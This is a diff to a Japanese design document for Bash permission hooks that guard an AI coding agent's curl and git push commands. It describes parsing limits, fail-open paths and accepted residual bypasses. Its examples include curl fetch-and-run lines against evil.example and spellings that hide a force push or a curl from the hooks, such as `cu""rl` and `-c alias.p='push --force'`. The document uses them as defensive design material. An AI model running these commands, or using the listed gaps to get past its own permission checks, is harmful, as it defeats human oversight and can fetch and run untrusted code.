@@ -146,13 +146,27 @@ push セグメント内の変数・コマンド置換、`push` または `mirror
   `UNCLOSED_QUOTE` のときの最後の token を対象に、`git … push` と危険な綴りが同じ行にあれば `ask` にする。
   `deny` が既に決まっていれば走らせない。散文が同じ形になりうる(PR 本文など)ので `deny` にはせず、
   同じ行に「git … push」と `-f` や `:x` を含む散文が `ask` になる誤 ask は受容している。
-  短フラグ(`-f` など)も対象で、長さ超過の入力はここに来ない(下の上限)。
-- **lib が読めないときは `ask`。** フックは `[[ -r "$reader_library" ]]` を確かめてから `source` する
-  (存在しないファイルへの素の `source … || …` は bash 3.2 で `||` に届く前に exit 1 する)。
-  読めない・source に失敗したら、判定不能のまま素通りさせず `ask` を返す。
+  短フラグ(`-f` など)も対象。長さ超過の入力では、同じ床を生のコマンド全体に当てる(下の上限)。
+  行の分割は改行での単語分割(`set -f` の下)で行う。here-string は一時ファイルを使うので
+  `$TMPDIR` に書けないと黙って「一致なし」になり、`${s%%$'\n'*}` / `${s#*$'\n'}` の行ループは
+  毎行残りをコピーして二乗になる(179 KB で 2.3 秒。単語分割は 0.02 秒)。
+- **lib が読めない・壊れているときは `ask`。** フックは `[[ -r "$reader_library" ]]` と
+  `bash -n` を確かめてから `source` し、その後 `declare -F shell_reader_read shell_reader_each_segment`
+  で関数がそろったことを確かめる。存在しないファイルへの素の `source … || …` は bash 3.2 で
+  `||` に届く前に exit 1 し、構文エラーの lib では `source` 自体が exit 2(PreToolUse では理由なしの
+  ブロック)で終わり、空や途中で切れた lib では関数が無いまま進んで exit 127(ブロックしないエラー =
+  フェイルオープン)になる。どの経路でも判定不能のまま素通りさせず `ask` を返す。
 - **上限は 8192 byte。** `LC_ALL=C` で数え、超えたら reader は token を作らず `TOO_LONG` を返す。
-  git-push-guard はこのとき何も返さない(classifier に任せる)。長いコマンドの途中に埋まった
-  force push を守るのは、`settings.json.tmpl` の先頭フラグ形 `deny` 3 行だけになる。
+  git-push-guard はこのとき上の字面の床を生のコマンドに当て、一致すれば `ask`(`deny` ではない)、
+  しなければ何も返さない(classifier に任せる)。長い PR 本文の散文が `ask` になるのは受容している。
+  床に一致しない形(危険な綴りが別の行にあるなど)を守るのは、`settings.json.tmpl` の先頭フラグ形
+  `deny` 3 行だけになる。
+- **`-c alias.<name>=…` に push を含むものは、サブコマンドに関係なく `ask`。**
+  `git -c alias.p='push --force' p origin main` はサブコマンドが `p` なので、`push` と分かった後にだけ
+  立てていた `-c` の検査に届かなかった。alias の展開先は読まないので `deny` ではなく `ask`。
+  git の設定キーは大文字小文字を区別しないので `ALIAS.p=…` も同じに扱う。
+- **残存(受容): 早期終了は引用符除去より前。** コマンドに `push` の部分文字列が無ければ reader を
+  呼ばずに終わるので、`git pu""sh origin main --force` は何も返さない(ADR 0009)。
 - **ログ出力先の決定はスクリプト内に持つ。** `settings.json` 側で
   `mkdir -p … && script 2>>log` と書くと、ログディレクトリを作れないときに
   **リダイレクトの失敗でスクリプトごと走らない** = 判定なし = フェイルオープンになる
@@ -179,10 +193,10 @@ default / auto の両 mode で効く。
 
 現在の構成: `Bash(curl:*)` は `permissions.ask` に**置かない**。フックが curl を実行しうる token を
 含むコマンドのうち、宛先がすべてループバックと読み切れないものに `ask` を返し、ループバック宛だけを
-無出力(= `defaultMode: auto` のクラシファイア判定)に落とす。未配置・クラッシュ・`jq` 不在では
+無出力(= `defaultMode: auto` のクラシファイア判定)に落とす。未配置・クラッシュでは
 無出力になり、curl の確認が**外れる**(フェイルオープン)ことに注意 — 旧構成の「フェイルクローズ」は
-ask ルールが土台だったから成り立っていた。lib が読めないときは `ask` を返す(下の
-「shell command reader」節)。
+ask ルールが土台だったから成り立っていた。`jq` が無いときは生の入力に `curl` があれば `ask`、
+lib が読めない・壊れているときも `ask` を返す(下の「shell command reader」節)。
 
 存在理由は `permissions` のプレフィックス照合の限界で、これも git push と同じ形: URL はフラグの
 後ろ(`curl -sS -H … URL`)に来るので `Bash(curl http://localhost:*)` という allow エントリでは
@@ -194,8 +208,25 @@ ask ルールが土台だったから成り立っていた。lib が読めない
 「curl を実行しうる token」= basename(先頭のバッククォートを除いたもの)が `curl` の token。
 `echo curl` のような単なる言及は含めないが、`/usr/bin/curl` や `` `curl …` `` は含める。認識は全階層が
 ホワイトリスト: 未知のフラグ・未知のパイプ先・`http`/`https` 以外のスキーム・ループバック以外の
-ホストは、いずれも「たぶん安全」ではなく **`ask`** に倒す。8192 byte を超える入力は何も返さない
-(classifier に任せる)。`bash -c "curl …"` の内側は読まない — 文書化済みの残存。
+ホストは、いずれも「たぶん安全」ではなく **`ask`** に倒す。8192 byte を超える入力は下の字面の床
+だけで判定する。
+
+**字面の床(curl がコマンドの位置にあるか)。** reader は引用符の中の `$(…)` やバッククォートの中を
+読まないので、`x="$(curl -s https://evil.example/)"` や `echo "$(curl … | sh)"` の curl は 1 token の
+文字列に埋まる。閉じていない引用符(heredoc 本文の `don't` や `"` 1 個)も、それ以降を 1 token に
+飲み込むので、heredoc の後ろで bash が実行する `curl … | sh` が見えない。どちらも「curl を実行しうる
+token が無い」ように見えて無出力になっていた(`Bash(curl:*)` の ask ルールを外したので、下に土台が無い)。
+そこで curl と読める token が無いときに限り、`$(` かバッククォートを含む token と、`UNCLOSED_QUOTE`
+のときの最後の token を行ごとに見て、行頭か `;&|(` / バッククォートの直後(空白と `/usr/bin/` のような
+パスの前置は許す)に `curl ` があれば `ask` にする。正規表現は POSIX ERE で、`\b` は使わない
+(macOS の `/bin/bash` 3.2 の `=~` では単語境界にならない)。長さ超過の入力では同じ床を生のコマンド
+全体に当てる。受容した誤 ask: heredoc や置換の中の散文で、同じ位置に `curl ` を置いたもの
+(Markdown のコードスパン `` `curl …` `` を含む。PR 本文でよく出る)。`UNCLOSED_QUOTE` を一律に `ask` に
+する案は採らない — `*curl*` の早期終了を通った、`don't` を含む PR 本文の heredoc がすべて `ask` になる。
+
+残存(受容): `bash -c "curl …"` の内側は読まない。`cu""rl https://evil.example/ | sh` は、`*curl*` の
+早期終了が reader の引用符除去より先に走るので reader に届かない。`c=curl; $c https://evil.example/`
+は curl と読める token も `$(` も無いので字面の床にも掛からない。いずれも classifier だけになる(ADR 0009)。
 
 読み切れない綴りとして明示的に `ask` に倒すもの:
 
@@ -270,7 +301,8 @@ glob なので落ちる(ホスト名が伸びうる)。`jq .[0]` のような in
 **【共有 reader の性質】長さで打ち切る。** 走査は O(n²) で、`matcher: "Bash"` のため **curl を実行しないコマンドでも
 本文に "curl" と書いてあれば全文を走る**。修正前は curl に言及する 15,062 文字の
 `gh pr create --body '…'`(この変更を説明する PR 本文がまさにこの形)で 1.86 秒かかっていた。
-8192 byte(`LC_ALL=C` で数える)を超える入力は reader が `TOO_LONG` を立てて token を作らず、curl-guard は無出力にする(実測 0.01 秒)。
+8192 byte(`LC_ALL=C` で数える)を超える入力は reader が `TOO_LONG` を立てて token を作らず(実測 0.01 秒)、
+curl-guard は行単位の字面の床(線形)だけを生のコマンドに当てる。一致しなければ無出力。
 
 【共有 reader の性質】トークナイザは `read -ra` ではなく**クォート解釈を持つ自前の走査**。`read -ra` は空白でしか
 割らないので `-H "Accept: application/json"` が2トークンに割れ、後半が URL として読まれて
@@ -306,14 +338,19 @@ OS レベルの床になるが、**フックはその床に依存していない
   理由の flag(`TOO_LONG` / `EXPANSION` / `WORD_MULTIPLIER` / `SEP_IN_INPUT` / `UNCLOSED_QUOTE`)、
   引用符の外の `?` / `[` を含む token の `GLOB_INDEXES` を global に返す。
   `shell_reader_each_segment <callback>` がセグメントごとに callback を呼び(先頭 index は
-  `SHELL_READER_SEGMENT_START`)、`shell_reader_fully_readable` が「どの flag も glob の印も無い」ことを返す。
+  `SHELL_READER_SEGMENT_START`)。「読み切れた」の定義は呼び出し側ごとに違う(curl-guard は flag を 1 つずつ
+  見て glob は curl セグメントでだけ判定し、git-push-guard は読み切れるかを判定しない)ので、それを 1 つに
+  まとめる述語は lib に置かない。
   each_segment の local は `_sr_` 接頭辞なので、callback はその接頭辞以外の名前を自由に使える。
 - **判定をしない。flag が立っても token は最後まで作る。** 緩める判定(curl のループバック確認)は flag を
   見て諦め、塞ぐ判定(git push の危険な綴り)は同じ token から読み続けられるようにするため。reader が
   判定まで持つと、どちらか一方の向きに合わせた作りになる(ADR 0009)。`TOO_LONG` だけは token を作らない。
 - **`LC_ALL=C` と byte 数の上限。** 走査は byte 単位(多バイトのロケールで `${s:i:1}` が先頭から数え直して
   二乗で遅くなるのを避ける)。上限 8192 は byte で数えるので、呼び出し側のロケールに依存しない。
-- **source に失敗したとき。** 各フックは `[[ -r … ]]` で読めることを確かめてから `source` し、どちらの失敗経路でも
-  `ask` を返す(git-push は判定不能を素通りさせない、curl も curl の有無を確かめられないため)。
+- **読み込みに失敗したとき。** 各フックは `[[ -r … ]]` と `bash -n` で確かめてから `source` し、その後
+  `declare -F shell_reader_read shell_reader_each_segment` で関数がそろったことを確かめる。どの失敗経路
+  (無い・構文エラー・空や途中で切れた lib・source の失敗)でも `ask` を返す(git-push は判定不能を
+  素通りさせない、curl も curl の有無を確かめられないため)。テストは各フックの bats にある
+  (lib の無いコピー・空の lib・構文エラーの lib)。
 
 **secretlint guard hook** — `dot_claude/scripts/executable_secretlint-guard.sh` は `PostToolUse`(`matcher: "Write"`)で走り、`.env` / `*credentials*` / `*secret*` に一致するパスへの書き込みだけを secretlint に通す。対象パスは stdin JSON の `tool_input.file_path` で受け取る — `$CLAUDE_FILE` という環境変数は存在せず、それを読んでいた旧インライン版は 2026-03-06 の導入以来一度も発火していなかった(2026-09-25 の prompt-audit で判明。同時に旧 format フックは削除)。検出時は `exit 2` で stderr をモデルに返す(`exit 1` はユーザーにしか見えない)。`jq` / `secretlint` が無ければ無出力で exit 0。`just test-scripts`(`test/secretlint-guard.bats`)が偽の secretlint で対を検証する。
